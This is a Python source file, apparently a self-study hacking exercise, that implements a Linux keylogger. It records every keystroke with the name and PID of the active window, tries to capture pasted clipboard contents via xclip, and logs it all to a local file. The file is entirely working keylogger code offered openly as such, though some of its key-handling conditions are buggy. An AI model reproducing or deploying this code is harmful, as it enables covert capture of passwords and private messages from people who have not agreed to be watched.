

from pynput import keyboard
import logging
import subprocess
from Xlib import display, X


LOG_FILE = "/home/samurai/Desktop/Python_For_Hacking/Keylogging_For_Fun/kali_logs.txt"

logging.basicConfig(filename=LOG_FILE,level=logging.DEBUG,format="%(asctime)s - %(message)s")


def get_active_window():

    try:
        d = display.Display()
        window = d.get_input_focus().focus
        window_name = window.get_wm_name()
        window_pid = window.get_net_wm_pid()
        return f"[PID: {window_pid} - {window_name}]" if window_name else "[Unknown Window]"
    except:
        return "[Window Detection Failed]"
    

current_window = None

def on_press(key):

    global current_window

    new_window = get_active_window()
    if new_window != current_window:
        current_window = new_window
        logging.info(f"\n{current_window}\n")

    try:
        logging.info(str(key.char))
    except AttributeError:

        if key == keyboard.Key.space:
            logging.info(" ")
        elif key == keyboard.Key.enter:
            logging.info("\n[ENTER]\n")
        elif key == keyboard.Key.tab:
            logging.info("[TAB]")
        elif key == keyboard.Key.backspace:
            logging.info("[BACKSPACE]")
        elif key == keyboard.Key.ctrl_l or keyboard.Key.ctrl_r:
            logging.info("[CTRL]")
        elif key == keyboard.Key.alt_l or keyboard.Key.alt_r:
            logging.info("[ALT]")
        elif key == keyboard.Key.shift_l or keyboard.Key.shift_r:
            logging.info("[SHIFT]")
        elif key == keyboard.Key.cmd:
            logging.info("[SUPER]")
        else:
            logging.info(f"[{key}]")
    
    if key == keyboard.KeyCode.from_char('v') and any(k in (keyboard.Key.ctrl_l,keyboard.Key.ctrl_r) for k in keyboard.Controller().pressed):
        try:
            clipboard = subprocess.check_output(['xclip','-selection','clipboard','-o']).decode().strip()
            logging.info(f"\n[PASTE] - {clipboard}\n")
        except:
            logging.info("\n[PASTE] - Failed to read clipboard\n")


with keyboard.Listener(on_press=on_press) as listener:
    print(f"Keylogger started. Logging to: {LOG_FILE}")
    listener.join()   
    